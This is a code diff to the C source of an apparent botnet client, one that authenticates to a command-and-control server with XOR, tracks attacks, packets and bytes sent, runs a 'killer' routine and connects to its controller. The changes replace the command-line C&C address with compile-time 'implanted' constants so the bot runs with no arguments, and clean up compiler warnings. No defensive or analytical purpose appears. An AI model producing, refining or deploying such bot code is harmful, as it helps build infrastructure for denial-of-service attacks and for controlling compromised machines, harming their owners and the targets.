@@ -24,7 +24,7 @@ volatile int attack_active = 0;
 int main_pid = 0;
 int watcher_pid = 0;
 int attack_ongoing[10] = {0};
-int cnc_port = 1337;
+int cnc_port = CNC_PORT;
 
 // Statistics
 volatile long long total_attacks = 0;
@@ -32,6 +32,7 @@ volatile long long total_packets = 0;
 volatile long long total_bytes = 0;
 
 void signal_handler(int sig) {
+    (void)sig; // Silence unused parameter warning
     printf("\n\033[1;33m[*] Received shutdown signal...\033[0m\n");
     running = 0;
     attack_active = 0;
@@ -70,10 +71,11 @@ int authenticate_bot(int sockfd) {
     buffer[bytes] = 0;
     
     // Simple XOR authentication
-    for(int i = 0; i < strlen(challenge); i++) {
+    size_t challenge_len = strlen(challenge);
+    for(size_t i = 0; i < challenge_len; i++) {
         response[i] = challenge[i] ^ 0x55;
     }
-    response[strlen(challenge)] = 0;
+    response[challenge_len] = 0;
     
     if(strcmp(buffer, response) == 0) {
         send(sockfd, "AUTH_OK", 7, 0);
@@ -176,15 +178,14 @@ void connect_to_cnc(const char* cnc_ip, int cnc_port) {
 }
 
 int main(int argc, char *argv[]) {
-    if(argc != 3) {
-        printf("Usage: %s <cnc_ip> <cnc_port>\n", argv[0]);
-        printf("Example: %s 192.168.1.100 1337\n", argv[0]);
-        return 1;
-    }
+    // Use implanted C&C server details
+    const char* cnc_ip = CNC_SERVER;
+    cnc_port = CNC_PORT;
+    
+    printf("Starting bot with implanted C&C: %s:%d\n", cnc_ip, cnc_port);
     
     // Set global variables
     main_pid = getpid();
-    cnc_port = atoi(argv[2]);
     
     // Set signal handlers
     signal(SIGINT, signal_handler);
@@ -205,7 +206,6 @@ int main(int argc, char *argv[]) {
     killer_main();
     
     // Connect to C&C server
-    const char* cnc_ip = argv[1];
     connect_to_cnc(cnc_ip, cnc_port);
     
     printf("\033[1;31m[!] Bot shutting down...\033[0m\n");
